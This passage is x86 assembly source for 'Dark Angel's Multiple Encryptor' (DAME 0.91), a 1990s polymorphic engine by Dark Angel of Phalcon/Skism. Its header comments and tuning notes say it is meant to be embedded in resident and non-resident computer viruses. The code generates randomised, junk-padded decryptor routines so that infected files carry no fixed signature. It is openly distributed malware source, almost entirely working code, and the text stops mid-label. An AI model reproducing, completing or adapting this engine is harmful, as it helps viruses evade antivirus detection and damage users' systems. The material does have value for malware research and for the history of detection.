comment #

                        Dark Angel's Multiple Encryptor
                                 Version 0.91
                        By Dark Angel of Phalcon/Skism

        This source may be freely distributed.  Modifications are
        encouraged and modified redistribution is allowed provided
        this notice and the revision history to date are not altered.
        You are free to append to the revision history and update the
        usage information.

 Welcome to the source code for Dark Angel's Multiple Encryptor.
 I, Dark Angel, will be your host for this short excursion through
 a pretty nifty encryptor.

 DAME 0.90 (1574 bytes)
 ~~~~ ~~~~ ~~~~~~~~~~~~
   Initial release.

 DAME 0.91 (1960 bytes)
 ~~~~ ~~~~ ~~~~~~~~~~~~
   Source code commented.

   The user no longer needs to call the encryption routine manually;
   the routine calls it automatically.  This makes DAME a bit more
   "user friendly."

   Garbling with two pointer registers simultaneously, i.e. [bx+di+offset]
   is now supported.

   Added "double-reference" encryptions.  Example:
        mov     ax,[bx+3212]
        xor     ax,3213
        mov     [bx+3212],ax

   There is now a bitflag option to generate a decryptor which will transfer
   control to the buffer on a paragraph boundary.

   There is now a 1% chance that no encryption will be encoded when
   the "do_encrypt1" routine is called.  Of course, null effect
   encryptors may still be generated.

   garble_jmpcond is much more robust.  It can now put valid instructions
   between the conditional jump and the target of the jump.  Therefore,
   there is no longer a multitude of JZ $+2's and the like.  Instead, they
   are replaced by JZ $+4, XOR BX,BX, for example.

   The register tracker is cleared after the loop is completed.  This makes
   sense, since the registers are no longer needed.  This also allows for the
   manipulation of those used registers in the garbling after the loop is
   completed.

   Encoding routines enhanced: Two-byte PUSHes and POPs and four-byte register
   MOVes added.  Memory PUSHes and POPs are now supported.

   The maximum nesting value is now the variable _maxnest, which can range
   from 0 to MAXNEST.  _maxnest is determined randomly at runtime.  This makes
   the decryption routines a bit more interesting.  _nest is also cleared more
   times during the run so that variability is continuous throughout.

   Short decryptor option added.  This is automatically used when generating
   the encryptor so the encryptor will always be of minimal length.

   More alignments are now possible.  This makes the initial values of the
   registers more flexible.

   BUG FIXES:

   BP is now preserved on exit

   Prefetch queue flushed on backwards encryption; 386+ hangs eliminated.
   See routine named "clear_PIQ"

   Loopnz routines had possibility of not working properly; instruction
   eliminated.

   NOTES:

   I forgot to give credit to the person from whom I stole the random number
   routines.  I took them from the routine embedded in TPE 1.x (I misremember
   the version number).  Many thanks to Masud Khafir!

   USAGE:

   ON ENTRY:
     ax = flags
       bit 15 : Use two registers for pointer : 0 = no, 1 = yes
       bit 14 : Align size : 0 = word, 1 = dword
       bit 13 : Encryption direction : 0 = forwards, 1 = backwards
       bit 12 : Counter direction : 0 = forwards, 1 = backwards
       bit 11 : Counter register used : 0 = no, 1 = yes
       bit 10 : Temporary storage for double reference
       bit  9 : Unused
       bit  8 : Unused
       bit  7 : Unused
       bit  6 : Unused
       bit  5 : Unused
       bit  4 : Unused
       bit  3 : return control on paragraph boundary : 1 = yes, 0 = no
       bit  2 : short decryptor : 1 = yes, 0 = no (implies no garbling)
       bit  1 : garble : 1 = yes, 0 = no
       bit  0 : SS = DS = CS : 1 = yes, 0 = no
     bx = start decrypt in carrier file
     cx = encrypt length
     dx = start encrypt
     si = buffer to put decryption routine
     di = buffer to put encryption routine

     ds = cs on entry
     es = cs on entry

   RETURNS:
     cx = decryption routine length
     DF cleared
     all other registers are preserved.
     The RADIX is set to 16d.

   NOTES:

   rnd_init_seed is _not_ called by DAME.  The user must explicitly call it.

   The buffer containing the routine to be encrypted should be 20 bytes
   larger than the size of the routine.  This allows padding to work.

   The decryption routine buffer should be rather large to accomodate the
   large decryptors which may be generated.

   The encryption routine buffer need not be very large; 80h bytes should
   suffice.  90d bytes is probably enough, but this value is untested.
#

.radix 10h

ifndef vars
        vars = 2
endif

if not vars eq 1        ; if (vars != 1)

_ax = 0
_cx = 1
_dx = 2
_bx = 3
_sp = 4
_bp = 5
_si = 6
_di = 7

_es = 8
_cs = 9
_ss = 0a
_ds = 0bh

; The constant MAXNEST determines the maximum possible level of nesting
; possible in any generated routine.  If the value is too large, then
; recursion problems will cause a stack overflow and the program will
; crash.  So don't be too greedy.  0Ah is a safe value to use for non-
; resident viruses.  Use smaller values for resident viruses.
ifndef MAXNEST          ; User may define MAXNEST prior to including
        MAXNEST = 0a    ; the DAME source code. The user's value will
endif                   ; then take precedence

rnd_init_seed:
        push    dx cx bx
        mov     ah,2C                   ; get time
        int     21

        in      al,40                   ; port 40h, 8253 timer 0 clock
        mov     ah,al
        in      al,40                   ; port 40h, 8253 timer 0 clock
        xor     ax,cx
        xor     dx,ax
        jmp     short rnd_get_loop_done
get_rand:
        push    dx cx bx
        in      al,40                   ; get from timer 0 clock
        db      5 ; add ax, xxxx
rnd_get_patch1  dw      0
                db      0BA  ; mov dx, xxxx
rnd_get_patch2  dw      0
        mov     cx,7

rnd_get_loop:
        shl     ax,1
        rcl     dx,1
        mov     bl,al
        xor     bl,dh
        jns     rnd_get_loop_loc
        inc     al
rnd_get_loop_loc:
        loop    rnd_get_loop

rnd_get_loop_done:
        mov     rnd_get_patch1,ax
        mov     rnd_get_patch2,dx
        mov     al,dl
        pop     bx cx dx
        retn

reg_table1:
              ; reg1 reg2 mod/00/rm   This is used to handle memory addressing
        db       _bx, 84, 10000111b ; of the form [reg1+reg2+xxxx]
        db       _bp, 84, 10000110b ; if (reg2 == 84)
        db       _di, 84, 10000101b ;    reg2 = NULL;
        db       _si, 84, 10000100b

        db      _bp, _di, 10000011b
        db      _bp, _si, 10000010b
        db      _bx, _di, 10000001b
        db      _bx, _si, 10000000b
        db      _di, _bp, 10000011b
        db      _si, _bp, 10000010b
        db      _di, _bx, 10000001b
        db      _si, _bx, 10000000b

aligntable      db      3,7,0bh,0f,13,17,1bh,1f ; possible alignment masks

redo_dame:
        pop     di bp si dx cx bx ax
dame:   ; Dark Angel's Multiple Encryptor
        cld
        push    ax bx cx dx si bp di
        call    _dame
        pop     di
        push    cx di
        call    di
        pop     di cx bp si dx bx bx ax
        ret

_dame:  ; set up initial values of the variables
        cld
        push    ax

        mov     ax,offset _encryptpointer
        xchg    ax,di                           ; save the pointer to the
        stosw                                   ; encryption routine buffer
        xchg    si,ax                           ; also save the pointer to
        stosw                                   ; the decryption routine
                                                ; buffer in the same manner
        stosw

        xchg    ax,dx                           ; starting offset of
        stosw                                   ; encryption
        xchg    ax,bx                           ; starting offset of
        stosw                                   ; decryption routine

        xchg    cx,dx                           ; dx = encrypt size

        xor     ax,ax
        mov     cx,(endclear1 - beginclear1) / 2; clear additional data
        rep     stosw                           ; area

        call    get_rand                        ; get a random number
        and     ax,not 0f                       ; clear user-defined bits

        pop     cx                              ; cx = bitmask
        xor     cx,ax                           ; randomize top bits

        call    get_rand_bx                     ; get a random number
        and     bx,7                            ; and lookup in the table
        mov     al,byte ptr [bx+aligntable]     ; for a random rounding size
        cbw
        add     dx,ax                           ; round the encryption
        not     ax                              ; size to next word, dword,
        and     dx,ax                           ; etc.

        mov     ax,dx                           ; save the new encryption
        stosw                                   ; length (_encrypt_length)

        shr     ax,1                            ; convert to words
        test    ch,40                           ; encrypting double wordly?
        jz      word_encryption                 ; nope, only wordly encryption
        shr     ax,1                            ; convert to double words
word_encryption:                                ; all the worldly encryption
        test    ch,10                           ; shall do thee no good, my
        jnz     counter_backwards               ; child, lest you repent for
        neg     ax                              ; the sins of those who would
counter_backwards:                              ; bring harm unto others
        stosw                                   ; save _counter_value
        push    dx                              ; Save rounded length

        call    get_rand                        ; get a random value for the
        stosw                                   ; encryption value
                                                ; (_decrypt_value)
        pop     ax                              ; get rounded encryption length
                                                ; in bytes
        test    ch,20                           ; is the encryption to run
        jnz     encrypt_forwards                ; forwards or backwards?
        neg     ax                              ; Adjust for forwards
encrypt_forwards:
        xor     bx,bx                           ; Assume pointer_value2 = 0

        test    ch,80                           ; Dual pointer registers?
        jz      no_dual
        call    get_rand_bx
        sub     ax,bx
no_dual:stosw                                   ; Save the pointers to the
        xchg    ax,bx                           ; decryption (_pointer_value1
        stosw                                   ; and _pointer_value2)

; The following lines determine the registers that go with each function.
; There are a maximum of four variable registers in each generated
; encryption/decryption routine pair -- the counter, two pointer registers,
; and an encryption value register.  Only one pointer register need be present
; in the pair; the other three registers are present only if they are needed.

s0:     call    clear_used_regs                 
        mov     di,offset _counter_reg
        mov     al,84                           ; Assume no counter register
        test    ch,8                            ; Using a counter register?
        jz      s1
        call    get_rand                        ; get a random initial value
        mov     _pointer_value1,ax              ; for the pointer register
        call    get_another                     ; get a counter register
s1:     stosb                                   ; Store the counter register

        xchg    ax,dx

        mov     al,84                           ; Assume no encryption register
        call    one_in_two                      ; 50% change of having an
        js      s2                              ; encryption register
                                                ; Note: This merely serves as
                                                ; an extra register and may or
                                                ; may not be used as the
                                                ; encryption register.
        call    get_another                     ; get a register to serve as
s2:     stosb                                   ; the encryption register

        cmp     ax,dx                           ; normalise counter/encryption
        ja      s3                              ; register pair so that the
        xchg    ax,dx                           ; smaller one is always in the  
s3:     mov     ah,dl                           ; high byte
        cmp     ax,305                          ; both BX and BP used?
        jz      s0                              ; then try again
        cmp     ax,607                          ; both SI and DI used?
        jz      s0                              ; try once more

s4:     mov     si,offset reg_table1            ; Use the table
        mov     ax,3                            ; Assume one pointer register
        test    ch,80                           ; Using two registers?
        jz      use_one_pointer_reg
        add     si,4*3                          ; Go to two register table
        add     al,4                            ; Then use appropriate mask
use_one_pointer_reg:
        call    get_rand_bx                     ; Get a random value
        and     bx,ax                           ; Apply mask to it
        add     si,bx                           ; Adjust table offset
        add     bx,bx                           ; Double the mask
        add     si,bx                           ; Now table offset is right
        lodsw                                   ; Get the random register pair
        mov     bx,ax                           ; Check if the register in the
        and     bx,7                            ; low byte is already used
        cmp     byte ptr [bx+_used_regs],0
        jnz     s4                              ; If so, try again
        mov     bl,ah                           ; Otherwise, check if there is
        or      bl,bl                           ; a register in the high byte
        js      s5                              ; If not, we are done
        cmp     byte ptr [bx+_used_regs],0      ; Otherwise, check if it is
        jnz     s4                              ; already used
s5:     stosw                                   ; Store _pointer_reg1, 
        movsb                                   ; _pointer_reg2, and 
                                                ; _pointer_rm
calculate_maxnest:
        call    get_rand                        ; Random value for _maxnest
        and     al,0f                           ; from 0 to MAXNEST
        cmp     al,MAXNEST                      ; Is it too large?
        ja      calculate_maxnest               ; If so, try again
        stosb                                   ; Otherwise, we have _maxnest

        call    clear_used_regs                 ; mark no registers used
encode_setup:                                   ; encode setup portion
        mov     di,_decryptpointer              ; (pre-loop) of the routines
        call    twogarble                       ; start by doing some garbling
                                                ; on the decryption routine
        mov     si,offset _counter_reg          ; now move the initial
        push    si                              ; values into each variable
encode_setup_get_another:                       ; register -- encode them in a
        call    get_rand_bx                     ; random order for further
                                                ; variability
        and     bx,3                            ; get a random register to en-
        mov     al,[si+bx]                      ; code, i.e. counter, pointer,
        cbw                                     ; or encryption value register
        test    al,80                           ; is it already encoded?
        jnz     encode_setup_get_another        ; then get another register

        or      byte ptr [bx+_counter_reg],80   ; mark it encoded in both the
        mov     si,ax                           ; local and
        inc     byte ptr [si+_used_regs]        ; master areas

        add     bx,bx                           ; convert to word offset
        mov     dx,word ptr [bx+_counter_value] ; find value to set the
                                                ; register to
        mov     _nest,0                         ; clear the current nest count
        call    mov_reg_xxxx                    ; and encode decryption routine
                                                ; instruction
        call    twogarble                       ; garble it some more
        call    swap_decrypt_encrypt            ; now work on the encryption
                                                ; routine
        push    cx                              ; save the current bitmap
        and     cl,not 7                        ; encode short routines only
        call    _mov_reg_xxxx                   ; encode the encryption routine
                                                ; instruction
        pop     cx                              ; restore bitmap

        mov     _encryptpointer,di              ; return attention to the
                                                ; decryption routine
        pop     si
        mov     dx,4
encode_setup_check_if_done:                     ; check if all the variables
                                                ; have been encoded
        lodsb                                   ; get the variable
        test    al,80                           ; is it encoded?
        jz      encode_setup                    ; nope, so continue encoding
        dec     dx                              ; else check the next variable
        jnz     encode_setup_check_if_done      ; loop upwards

        mov     si,offset _encryptpointer       ; Save the addresses of the 
        mov     di,offset _loopstartencrypt     ; beginning of the loop in
        movsw                                   ; the encryption and decryption
        movsw                                   ; routines

; Encode the encryption/decryption part of loop
        mov     _relocate_amt,0                 ; reset relocation amount
        call    do_encrypt1                     ; encode encryption

        test    ch,40                           ; dword encryption?
        jz      dont_encrypt2                   ; nope, skip

        mov     _relocate_amt,2                 ; handle next word to encrypt
        call    do_encrypt1                     ; and encrypt!
dont_encrypt2:
; Now we are finished encoding the decryption part of the loop.  All that
; remains is to encode the loop instruction, garble some more, and patch
; the memory manipulation instructions so they encrypt/decrypt the proper
; memory locations.
        mov     bx,offset _loopstartencrypt     ; first work on the encryption
        push    cx                              ; save the bitmap
        and     cl,not 7                        ; disable garbling/big routines
        call    encodejmp                       ; encode the jmp instruction
        pop     cx                              ; restore the bitmap

        mov     ax,0c3fc ; cld, ret             ; encode return instruction
        stosw                                   ; in the encryption routine

        mov     si,offset _encrypt_relocator    ; now fix the memory
        mov     di,_start_encrypt               ; manipulation instructions

        push    cx                              ; cx is not auto-preserved
        call    relocate                        ; fix address references
        pop     cx                              ; restore cx

        mov     bx,offset _loopstartdecrypt     ; Now work on decryption
        call    encodejmp                       ; Encode the jmp instruction
        push    di                              ; Save the current pointer
        call    clear_used_regs                 ; Mark all registers unused
        pop     di                              ; Restore the pointer
        call    twogarble                       ; Garble some more
        test    cl,8                            ; Paragraph alignment on
        jnz     align_paragraph                 ; entry to virus?
        test    ch,20                           ; If it is a backwards
        jz      no_clear_prefetch               ; decryption, then flush the
        call    clear_PIQ                       ; prefetch queue (for 386+)
no_clear_prefetch:                              ; Curse the PIQ!!!!!
        call    twogarble                       ; Garble: the final chapter
        jmp     short PIQ_done
align_paragraph:
        mov     dx,di                           ; Get current pointer location
        sub     dx,_decryptpointer2             ; Calculate offset when control
        add     dx,_start_decrypt               ; is transfered to the carrier
        inc     dx                              ; Adjust for the JMP SHORT
        inc     dx
        neg     dx
        and     dx,0f                           ; Align on the next paragraph
        cmp     dl,10-2                         ; Do we need to JMP?
        jnz     $+7                             ; Yes, do it now
        test    ch,20                           ; Otherwise, check if we need
        jz      PIQ_done                        ; to clear the prefetch anyway
        call    clear_PIQ_jmp_short             ; Encode the JMP SHORT
PIQ_done:
        mov     _decryptpointer,di

        mov     si,offset _decrypt_relocator    ; Calculate relocation amount
        sub     di,_decryptpointer2
        add     di,_start_decrypt
relocate:
        test    ch,20                           ; Encrypting forwards or
        jz      do_encrypt_backwards            ; backwards?
        add     di,_encrypt_length              ; Backwards is /<0oI_
do_encrypt_backwards:                           ; uh huh uh huh uh huh
        sub     di,_pointer_value1              ; Calculate relocation amount
        sub     di,_pointer_value2
        mov     cx,word ptr [si-2]              ; Get relocation count
        jcxz    exit_relocate                   ; Exit if nothing to do
        xchg    ax,di                           ; Otherwise we be in business
relocate_loop:                                  ; Here we go, yo
        xchg    ax,di
        lodsw                                   ; Get address to relocate
        xchg    ax,di
        add     [di],ax                         ; Relocate mah arse!
        loop    relocate_loop                   ; Do it again 7 times
exit_relocate:                                  ; ('cause that makes 8)
        mov     di,_decryptpointer              ; Calculate the decryption
        mov     cx,di                           ; routine size to pass
        sub     cx,_decryptpointer2             ; back to the caller
        ret

encodejmp:
        mov     di,word ptr [bx+_encryptpointer-_loopstartencrypt]

        push    bx
        mov     _nest,0                         ; Reset nest count
        mov     al,_pointer_reg1                ; Get the pointer register
        and     ax,7                            ; Mask out any modifications
        mov     dx,2                            ; Assume word encryption
        test    ch,40                           ; Word or Dword?
        jz      update_pointer1
        shl     dx,1                            ; Adjust for Dword encryption
update_pointer1:
        test    ch,20                           ; Forwards or backwards?
        jz      update_pointer2
        neg     dx                              ; Adjust for backwards
update_pointer2:
        test    ch,80                           ; Are there two pointers?
        jz      update_pointer_now              ; Continue only if so

        sar     dx,1                            ; Halve the add value
        push    ax                              ; Save register to add
        call    add_reg_xxxx                    ; Add to first register
        mov     al,_pointer_reg2
        and     ax,7                            ; Add to the second pointer
        call    add_reg_xxxx                    ; register
        pop     bx
        test    ch,8                            ; Using a counter register?
        jnz     update_pointer_done             ; If not, continue this

        push    bx                              ; Save first register
        xchg    ax,dx                           ; Move second register to DX
        call    get_another                     ; Get new register regX
        call    mov_reg_reg                     ; MOV regX, _pointer_reg2
        pop     dx                              ; Restore first register
        call    add_reg_reg                     ; ADD regX, _pointer_reg1
        call    clear_reg                       ; Clear the temp register
        jmp     short update_pointer_done       ; Skip adjustment of pointer
                                                ; register (already done)
update_pointer_now:
        call    add_reg_xxxx                    ; Adjust pointer register
update_pointer_done:
        mov     dl,75                           ; Assume JNZ

        mov     al,_counter_reg                 ; Is there a counter register?
        and     ax,7
        cmp     al,_sp
        jz      do_jnz

        push    dx                              ; Save JNZ
        mov     dx,1                            ; Assume adjustment of one

        test    ch,10                           ; Check counter direction
        jz      go_counter_forwards             ; If forwards, increment the
                                                ; counter
        cmp     al,_cx                          ; Check if the counter is CX
        jnz     regular                         ; If not, then decrement the
                                                ; counter and continue
        call    one_in_two                      ; Otherwise, there is a 50%
        js      regular                         ; chance of using a LOOP

        pop     dx
        mov     dl,0e2                          ; let us encode the LOOP
        jmp     short do_jnz

regular:neg     dx
go_counter_forwards:
        call    add_reg_xxxx                    ; Adjust counter register
        pop     dx
do_jnz: pop     bx
        mov     ax,[bx]                         ; Calculate value to JNZ/LOOP
        sub     ax,di                           ; back
        dec     ax
        dec     ax
        xchg    ah,al                           ; Value is in AL
        mov     al,dl   ; jnz

        or      ah,ah                           ; Value >= 128?  If so, it is
        js      jmplocation_okay                ; impossible to JNZ/LOOP there
                                                ; due to stupid 8086 limitation
        pop     ax ax                           ; Take return locations off
        jmp     redo_dame                       ; the stack and encode again
jmplocation_okay:
        stosw                                   ; Encode JNZ/LOOP instruction
        mov     word ptr [bx+_encryptpointer-_loopstartencrypt],di
        ret                                     ; Save current location

encryption:
; This routine encodes the instruction which actually manipulates the memory
; location pointed to by the pointer register.
        and     ch,not 4                        ; Default = no double reference
        call    one_in_two                      ; But there is a 50% chance of
        js      not_double_reference            ; using a double reference
        or      ch,4                            ; Yes, we are indeed using it
not_double_reference:
        mov     di,_decryptpointer              ; Set the registers to work
        mov     bp,offset _decrypt_relocate_num ; with the decryption routine
        call    twogarble                       ; Insert some null instructions

        xor     ax,ax                           ; Get the value for the rm
        mov     al,_pointer_rm                  ; field corresponding to the
                                                ; pointer register/s used
        call    choose_routine                  ; Get random decryption type
        call    go_next                         ; to DX, BX, SI
        push    si dx si dx                     ; Save crypt value/register
                                                ; and crypt pointer
;;        mov     _nest,0 ; not needed - choose_routine does it
        test    ch,4
        jz      not_double_reference1           ; Double reference?

        xchg    ax,dx                           ; Pointer register/s to dx
        call    get_another                     ; Unused register to AX (reg1)
        call    mov_reg_reg                     ; MOV reg1,[pointer]
        mov     _kludge,dx                      ; Store the pointer register
not_double_reference1:
        pop     dx si                           ; Restore decryption pointer
        call    handle_jmp_table                ; Encode decryption routine
        push    bx                              ; Save routine that was used
        call    twogarble                       ; Garble some more for fun

        test    ch,4
        jz      not_double_reference2           ; Double reference?

        xchg    ax,dx                           ; reg1 to dx
        mov     ax,_kludge                      ; Restore pointer
        push    ax                              ; Save pointer
        call    mov_reg_reg                     ; MOV [pointer],reg1
        call    clear_reg_dx                    ; Return reg1 to free pool
        pop     ax                              ; Restore pointer
not_double_reference2:
        mov     bp,offset _encrypt_relocate_num ; Set the registers to work
        call    swap_decrypt_encrypt            ; with the encryption routine

        pop     bx dx si                        ; Restore crypt value/register
        call    go_next                         ; Convert to encryption table
        jmp     short finish_encryption         ; and encode the encryption
                                                ; corresponding to the
                                                ; decryption
do_encrypt1:                                    ; Perform encryption on a word
        call    playencrypt                     ; Alter encryption value
        call    get_rand                        ; Have a tiny chance
        cmp     ax,6                            ; (1% chance) of not
        jb      playencrypt                     ; encrypting at all
        call    encryption                      ; Encrypt!
playencrypt:                                    ; Update the encryption value
        mov     di,_decryptpointer
        call    twogarble

        mov     al,_encrypt_reg                 ; Encryption register used?
        and     ax,7
        cmp     al,4
        jz      swap_decrypt_encrypt

        call    get_rand_bx                     ; 75% chance of altering the
        cmp     bl,0c0                          ; encryption value register
        ja      swap_decrypt_encrypt            ; Exit if nothing is to occur

        call    choose_routine                  ; Select a method of updating
        call    handle_jmp_table_nogarble       ; Encode the decryption
        call    swap_decrypt_encrypt            ; Now work on encryption
finish_encryption:
        push    cx                              ; Save current bitmask
        and     cl,not 7                        ; Turn off garbling/mo routines
        call    [bx+si+1]                       ; Encode the same routine for
                                                ; the encryption
        pop     cx                              ; Restore the bitmask
        mov     _encryptpointer,di
        ret

choose_routine:
        mov     _nest,0                         ; Reset recursion counter
        call    one_in_two                      ; 50% chance of using an
        js      get_used_register               ; already used register as
                                                ; an update value
        call    get_rand_bx                     ; Get random number as the
                                                ; update value
        mov     si,offset oneregtable           ; Choose the update routine
                                                ; from this table
        jmp     short continue_choose_routine   ; Saves one byte over
                                                ; xchg dx,bx / ret
get_used_register:
; This routine returns, in DX, a register whose value is known at the current
; point in the encryption/decryption routines. SI is loaded with the offset
; of the appropriate table. The routine destroys BX.
        call    get_rand_bx                     ; Get a random number
        and     bx,7                            ; Convert to a register (0-7)
        cmp     bl,_sp                          ; Make sure it isn't SP; that
        jz      get_used_register               ; is always considered used
        cmp     byte ptr [bx+_used_regs],0      ; Check if the register is
        jz      get_used_register               ; currently in use
        mov     si,offset tworegtable           ; Use routine from this table
continue_choose_routine:
        xchg    dx,bx                           ; Move value to dx
        ret                                     ; and quit

swap_decrypt_encrypt:
        mov     _decryptpointer,di              ; save current pointer
        push    ax
        mov     al,_maxnest                     ; disable garbling
        mov     _nest,al
        pop     ax
        mov     di,_encryptpointer              ; replace with encryption
        ret                                     ; pointer

go_next:
; Upon entry, SI points to a dispatch table.  This routine calculates the
; address of the next table and sets SI to that value.
        push    ax
        lodsb                                   ; Get mask byte
        cbw                                     ; Convert it to a word
        add     si,ax                           ; Add it to the current 
        pop     ax                              ; location (table+1)
        inc     si                              ; Add two more to adjust
        inc     si                              ; for the mask
        ret                                     ; (mask = size - 3)

clear_used_regs:
        xor     ax,ax                           ; Mark registers unused
        mov     di,offset _used_regs            ; Alter _used_regs table
        stosw
        stosw
        inc     ax                              ; Mark SP used
        stosw
        dec     ax
        stosw
        ret

get_another:                                    ; Get an unused register
        call    get_rand                        ; Get a random number
        and     ax,7                            ; convert to a register
;        cmp     al,_sp
;        jz      get_another
        mov     si,ax
        cmp     [si+_used_regs],0               ; Check if used already
        jnz     get_another                     ; Yes, try again
        inc     [si+_used_regs]                 ; Otherwise mark the register
        ret                                     ; used and return

clear_reg_dx:                                   ; Mark the register in DX
        xchg    ax,dx                           ; unused
clear_reg:                                      ; Mark the register in AX
        mov     si,ax                           ; unused
        mov     byte ptr [si+_used_regs],0
        ret

free_regs:
; This checks for any free registers and sets the zero flag if there are.
        push    ax cx di
        mov     di,offset _used_regs
        mov     cx,8
        xor     ax,ax
        repne   scasb
        pop     di cx ax
        ret

one_in_two:                                     ; Gives 50% chance of
        push    ax                              ; something happening
        call    get_rand                        ; Get a random number
        or      ax,ax                           ; Sign flag set 50% of the
        pop     ax                              ; time
        ret

get_rand_bx:                                    ; Get a random number to BX
        xchg    ax,bx                           ; Save AX
        call    get_rand                        ; Get a random number
        xchg    ax,bx                           ; Restore AX, set BX to the
return:                                         ; random number
        ret

garble_onebyte:
; Encode a single byte that doesn't do very much, i.e. sti, int 3, etc.
        xchg    ax,dx                           ; Get the random number in AX
        and     al,7                            ; Convert to table offset
        mov     bx,offset onebytetable          ; Table of random bytes
        xlat                                    ; Get the byte
        stosb                                   ; and encode it
        ret

garble_jmpcond:
; Encode a random short conditional or unconditional JMP instruction.  The
; target of the JMP is an unspecified distance away.  Valid instructions
; take up the space between the JMP and the target.
        xchg    ax,dx                           ; Random number to AX
        and     ax,0f                           ; Convert to a random JMP
        or      al,70                           ; instruction
        stosw                                   ; Encode it
        push    di                              ; Save current location
        call    garble  ; May need to check if too large
        mov     ax,di                           ; Get current location
        pop     bx                              ; Restore pointer to the JMP
        sub     ax,bx                           ; Calculate the offset
        mov     byte ptr [bx-1], al             ; Put it in the conditional
        ret                                     ; JMP

clear_PIQ:
; Encode instructions that clear the prefetch instruction queue.
;   CALL/POP
;   JMP SHORT
;   JMP
        call    get_rand                        ; Get a random number
        mov     dl,ah                           ; Put high byte in DL
        and     dx,0f                           ; Adjust so JMP target is
                                                ; between 0 and 15 bytes away
        and     ax,3                            ; Mask AX
        jz      clear_PIQ_call_pop              ; 1/4 chance of CALL/POP
        dec     ax
        jz      clear_PIQ_jmp_short             ; 1/4 chance of JMP SHORT

        mov     al,0e9                          ; Otherwise do a straight JMP
clear_PIQ_word:                                 ; Handler if offset is a word
        stosb                                   ; Store the JMP or CALL
        xchg    ax,dx                           ; Offset to AX
        stosw                                   ; Encode it
clear_PIQ_byte:                                 ; Encode AX random bytes
        push    cx
        xchg    ax,cx                           ; Offset to CX
        jcxz    random_encode_done              ; Exit if no bytes in between
random_encode_loop:
        call    get_rand                        ; Get a random number
        stosb                                   ; Store it and then do this
        loop    random_encode_loop              ; again
random_encode_done:
        pop     cx
        ret

clear_PIQ_jmp_short:
        mov     al,0ebh                         ; JMP SHORT
        stosb                                   ; Encode the instruction
        xchg    ax,dx
        stosb                                   ; and the offset
        jmp     short clear_PIQ_byte            ; Encode intervening bytes

clear_PIQ_call_pop:
        mov     al,0e8                          ; CALL
        call    clear_PIQ_word                  ; Encode instruction, garbage
        call    garble                          ; Garble some and then find
        call    get_another                     ; an unused register
        call    clear_reg                       ; keep it unused
        jmp     short _pop                      ; and POP into it

twogarble:                                      ; Garble twice
        mov     _nest,0                         ; Reset nest count
        call    garble                          ; Garble once
garble: ; ax, dx preserved                      ; Garble
        call    free_regs                       ; Are there any unused
        jne     return                          ; registers?

        test    cl,2                            ; Is garbling enabled?
        jz      return                          ; Exit if not

        push    ax dx si

        call    get_rand                        ; Get a random number into
        xchg    ax,dx                           ; DX
        call    get_another                     ; And a random reg into AX
        call    clear_reg                       ; Don't mark register as used

        mov     si,offset garbletable           ; Garble away
        jmp     short handle_jmp_table_nopush

handle_jmp_table: ; ax,dx preserved             ; This is the master dispatch
        call    garble                          ; Garble before encoding
handle_jmp_table_nogarble:                      ; Encode it
        push    ax dx si
handle_jmp_table_nopush:
        push    ax
        lodsb                                   ; Get table mask
        cbw                                     ; Clear high byte
        call    get_rand_bx                     ; Get random number
        and     bx,ax                           ; Get random routine
        pop     ax

        test    cl,4                            ; Short decryptor?
        jnz     doshort                         ; If so, use first routine

        inc     _nest                           ; Update nest count
        push    ax
        mov     al,_maxnest
        cmp     _nest,al                        ; Are we too far?
        pop     ax
        jb      not_max_nest                    ; If so, then use the first
doshort:xor     bx,bx                           ; routine in the table
not_max_nest:
        push    bx                              ; Save routine to be called
        call    [bx+si]                         ; Call the routine
        pop     bx si dx ax
        ret

garble_tworeg:
; Garble unused register with the contents of a random register.
        mov     si,offset tworegtable           ; Use reg_reg table
        and     dx,7                            ; Convert to random register #
        jmp     short handle_jmp_table_nogarble ; Garble away

garble_onereg:
; Garble unused register with a random value (DX).
        mov     si,offset oneregtable           ; Point to the table
        jmp     short handle_jmp_table_nogarble ; and garble

_push:                                          ; Encode a PUSH
        or      al,al                           ; PUSHing memory register?
        js      _push_mem
        call    one_in_two                      ; 1/2 chance of two-byte PUSH
        js      _push_mem
        add     al,50                           ; otherwise it's really easy
        stosb
        ret
_push_mem:
        add     ax,0ff30
        jmp     short go_mod_xxx_rm1

_pop:                                           ; Encode a POP
        or      al,al                           ; POPing a memory register?
        js      _pop_mem
        call    one_in_two                      ; 1/2 chance of two-byte POP
        js      _pop_mem
        add     al,58
        stosb
        ret
_pop_mem:
        mov     ah,8f
go_mod_xxx_rm1:
        jmp     mod_xxx_rm

mov_reg_xxxx: ; ax and dx preserved
        mov     si,offset mov_reg_xxxx_table
go_handle_jmp_table1:
        jmp     short handle_jmp_table

_mov_reg_xxxx_mov_add:
        call    get_rand_bx                     ; Get a random number
        push    bx                              ; Save it
        sub     dx,bx                           ; Adjust MOV amount
        call    mov_reg_xxxx                    ; MOV to register
        pop     dx                              ; Get random number
        jmp     short go_add_reg_xxxx           ; Add it to the register

_mov_reg_xxxx_mov_al_ah:
        cmp     al,_sp
        jae     _mov_reg_xxxx
        push    ax dx
        call    _mov_al_xx
        pop     dx ax
        xchg    dh,dl
        jmp     short _mov_ah_xx

_mov_reg_xxxx_mov_xor:
        call    get_rand_bx
        push    bx
        xor     dx,bx
        call    mov_reg_xxxx
        pop     dx
        jmp     xor_reg_xxxx

_mov_reg_xxxx_xor_add:
        push    dx
        mov     dx,ax
        call    xor_reg_reg
        pop     dx
go_add_reg_xxxx:
        jmp     add_reg_xxxx

_mov_reg_xxxx_mov_rol:
        ror     dx,1
        call    mov_reg_xxxx
        jmp     short _rol

_mov_reg_xxxx_mov_ror:
        rol     dx,1
        call    mov_reg_xxxx
_ror:
        or      al,8
_rol:
        mov     ah,0d1
        jmp     short go_mod_xxx_rm1


_mov_reg_xxxx:
        call    one_in_two                      ; 1/2 chance of a four byte MOV
        js      _mov_reg_xxxx1

        add     al,0B8
        stosb
        xchg    ax,dx
        stosw
        ret
_mov_reg_xxxx1:                                 ; Do the four byte register MOV
        mov     ah,0c7
        jmp     mod_xxx_rm_stosw

mov_ah_xx:
_mov_ah_xx:
        add     al,04
mov_al_xx:
_mov_al_xx:
        add     al,0B0
        mov     ah,dl
        stosw
        ret

mov_reg_reg: ; ax, dx preserved
        mov     si,offset mov_reg_reg_table
        jmp     short go_handle_jmp_table1

_mov_reg_reg_push_pop:
        push    ax
        xchg    dx,ax
        call    _push                           ; PUSH REG2
        pop     ax
        jmp     _pop                            ; POP  REG1

_mov_reg_reg:
        mov     ah,08Bh
        jmp     short _mod_reg_rm_direction

mov_xchg_reg_reg:
